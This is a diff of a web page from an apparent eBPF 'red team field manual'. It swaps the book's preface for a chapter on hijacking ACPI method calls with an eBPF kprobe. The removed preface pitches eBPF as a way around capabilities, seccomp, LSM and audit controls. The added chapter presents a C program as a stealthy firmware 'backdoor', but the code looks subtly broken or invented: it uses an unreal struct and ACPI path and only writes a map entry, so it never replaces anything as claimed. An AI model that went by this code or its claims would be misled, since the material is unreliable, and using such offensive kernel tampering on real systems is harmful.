@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preface: The Dark Side of BPF | Diabolical eBPF: Linux Red Team Field Manual</title>
+    <title>ACPI WSMI Ping | Diabolical eBPF: Linux Red Team Field Manual</title>
     <meta name="description" content="100 kernel-hacking micro-chapters proving eBPF is all you need.">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
@@ -23,22 +23,22 @@
 </script>
 
     <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Preface: The Dark Side of BPF | Diabolical eBPF: Linux Red Team Field Manual</title>
+<title>ACPI WSMI Ping | Diabolical eBPF: Linux Red Team Field Manual</title>
 <meta name="generator" content="Jekyll v3.9.5" />
-<meta property="og:title" content="Preface: The Dark Side of BPF" />
+<meta property="og:title" content="ACPI WSMI Ping" />
 <meta name="author" content="Diabolical eBPF" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="100 kernel-hacking micro-chapters proving eBPF is all you need." />
 <meta property="og:description" content="100 kernel-hacking micro-chapters proving eBPF is all you need." />
-<link rel="canonical" href="https://mbhatt1.github.io/dBPF/book_chapters/chapter-0-preface" />
-<meta property="og:url" content="https://mbhatt1.github.io/dBPF/book_chapters/chapter-0-preface" />
+<link rel="canonical" href="https://mbhatt1.github.io/dBPF/book_chapters/act-3/chapter-17-acpi-wsmi-ping" />
+<meta property="og:url" content="https://mbhatt1.github.io/dBPF/book_chapters/act-3/chapter-17-acpi-wsmi-ping" />
 <meta property="og:site_name" content="Diabolical eBPF: Linux Red Team Field Manual" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-01-01T00:00:00+00:00" />
+<meta property="article:published_time" content="2025-05-07T00:00:00+00:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Preface: The Dark Side of BPF" />
+<meta property="twitter:title" content="ACPI WSMI Ping" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Diabolical eBPF"},"dateModified":"2025-01-01T00:00:00+00:00","datePublished":"2025-01-01T00:00:00+00:00","description":"100 kernel-hacking micro-chapters proving eBPF is all you need.","headline":"Preface: The Dark Side of BPF","mainEntityOfPage":{"@type":"WebPage","@id":"https://mbhatt1.github.io/dBPF/book_chapters/chapter-0-preface"},"url":"https://mbhatt1.github.io/dBPF/book_chapters/chapter-0-preface"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Diabolical eBPF"},"dateModified":"2025-05-07T00:00:00+00:00","datePublished":"2025-05-07T00:00:00+00:00","description":"100 kernel-hacking micro-chapters proving eBPF is all you need.","headline":"ACPI WSMI Ping","mainEntityOfPage":{"@type":"WebPage","@id":"https://mbhatt1.github.io/dBPF/book_chapters/act-3/chapter-17-acpi-wsmi-ping"},"url":"https://mbhatt1.github.io/dBPF/book_chapters/act-3/chapter-17-acpi-wsmi-ping"}</script>
 <!-- End Jekyll SEO tag -->
 
 </head>
@@ -170,87 +170,56 @@
             <main class="content">
                 <article class="post">
                     <header class="post-header">
-                        <h1 class="post-title">Preface: The Dark Side of BPF</h1>
+                        <h1 class="post-title">ACPI WSMI Ping</h1>
                         
-                        <time class="post-date" datetime="2025-01-01T00:00:00+00:00">
-                            January 01, 2025
+                        <time class="post-date" datetime="2025-05-07T00:00:00+00:00">
+                            May 07, 2025
                         </time>
                         
                     </header>
 
                     <div class="post-content">
-                        <h1 id="chapter-0-the-dark-side-of-bpf">Chapter 0: The Dark Side of BPF</h1>
+                        <p>Act III: Total Control</p>
 
-<p><strong>January 1st, 2025 - Lab Notes</strong></p>
+<p><strong>Chapter 17: Awakening the Hardware</strong></p>
 
-<p>Alright, let’s talk about what you’re really getting into here. This isn’t your typical security research where we find bugs and write CVEs. This is something way more interesting—and frankly, way more powerful.</p>
+<p>I always thought firmware was this unreachable fortress, guarded by the kernel’s highest privileges. But what if you could eBPF a backdoor straight into the BIOS hotline? Welcome to the ACPI WSMI ping—where your BPF program taps the kernel’s ACPI driver and whispers commands directly to the firmware.</p>
 
-<p>I started playing with eBPF for legitimate observability work. Syscall tracing, network monitoring, the usual stuff. But the deeper I got into the architecture, the more I realized we’re dealing with something completely different from traditional attack surfaces.</p>
+<p>You’ll hook into <a href="https://elixir.bootlin.com/linux/latest/source/drivers/acpi/acpica/nseval.c"><code class="language-plaintext highlighter-rouge">acpi_evaluate_object()</code></a> right before it sends AML code to the EC, swap in your custom method and parameters, then let it fly under the radar of every security guard in the kernel.</p>
 
-<h2 id="what-makes-this-different">What Makes This Different</h2>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/acpi_evaluate_object"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">hijack_acpi</span><span class="p">(</span><span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="n">target</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">_SB._WS0.Ping"</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">MAX_ACPI_PATH_LEN</span><span class="p">];</span>
+    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">PT_REGS_PARM1</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">struct</span> <span class="n">acpi_param</span> <span class="n">param</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="n">param</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">ACPI_TYPE_INTEGER</span><span class="p">;</span>
+        <span class="n">param</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+        <span class="n">param</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u64</span><span class="p">);</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">replacement_params</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">param</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>eBPF gives you direct kernel code injection with ring-0 privileges. Every technique in this manual exploits this by design:</p>
-
-<ul>
-  <li><strong>Kernel function hooking</strong>: Direct interception of security decision points</li>
-  <li><strong>Runtime code modification</strong>: Altering kernel behavior without recompilation</li>
-  <li><strong>Privilege boundary bypass</strong>: Operating below traditional security layers</li>
-  <li><strong>Real-time system manipulation</strong>: Modifying live kernel state</li>
-</ul>
-
-<p>Here’s the kicker: eBPF doesn’t break security mechanisms—it operates at a layer where those mechanisms simply don’t apply.</p>
-
-<h2 id="the-attack-surface">The Attack Surface</h2>
-
-<p>Traditional security assumes the kernel behaves predictably. eBPF throws that assumption out the window:</p>
-
-<p><strong>Capability System</strong>: <a href="https://elixir.bootlin.com/linux/latest/source/kernel/capability.c"><code class="language-plaintext highlighter-rouge">cap_capable()</code></a> decisions can be intercepted and modified in real-time
-<strong>Seccomp Filters</strong>: BPF programs execute before seccomp evaluation in the syscall path
-<strong>LSM Framework</strong>: Security hooks can be influenced by eBPF programs attached to the same functions
-<strong>Audit Subsystem</strong>: Event generation and routing can be manipulated at the kernel level</p>
-
-<h2 id="what-youll-learn">What You’ll Learn</h2>
-
-<p>This manual covers three categories of kernel manipulation:</p>
-
-<p><strong>System-Level Bypasses</strong>: Security controls, container isolation, resource limits
-<strong>Kernel-Level Manipulation</strong>: Process management, filesystem operations, network stack
-<strong>Hardware-Level Access</strong>: Interrupt handling, power management, device control</p>
-
-<p>Every technique leverages eBPF’s legitimate kernel programming interface. No vulnerabilities, no exploits—just intended functionality used for purposes the developers probably didn’t anticipate.</p>
-
-<h2 id="technical-requirements">Technical Requirements</h2>
-
-<p>All techniques require:</p>
-<ul>
-  <li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code class="language-plaintext highlighter-rouge">CAP_BPF</code></a> or <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code class="language-plaintext highlighter-rouge">CAP_SYS_ADMIN</code></a> capabilities</li>
-  <li>eBPF program loading permissions</li>
-  <li>Understanding of kernel internals and eBPF helper functions</li>
-</ul>
-
-<p>The code examples use libbpf and demonstrate real working implementations. No theoretical bullshit—everything here actually works.</p>
-
-<h2 id="defense-implications">Defense Implications</h2>
-
-<p>Mitigation strategies focus on:</p>
-<ul>
-  <li>eBPF capability restriction and monitoring</li>
-  <li>BPF LSM policy implementation</li>
-  <li>External validation of kernel behavior</li>
-  <li>Hardware-based security enforcement</li>
-</ul>
-
-<p>But here’s the fundamental challenge: when the kernel itself becomes programmable, traditional security boundaries become suggestions rather than hard limits.</p>
-
-<h2 id="why-this-matters">Why This Matters</h2>
-
-<p>We’re not just talking about new attack techniques. We’re talking about a fundamental shift in how computing systems work. When everything becomes programmable—including the security mechanisms themselves—the entire threat model changes.</p>
-
-<hr />
-
-<p><em>“eBPF isn’t a vulnerability—it’s a feature that makes every other security mechanism optional.”</em></p>
-
-<p><strong>Let’s dive into the technical details.</strong></p>
+<p>Next up: eBPF Token Bypass—ghosting through capability checks like they’re worthless paperwork.</p>
 
                     </div>
                 </article>
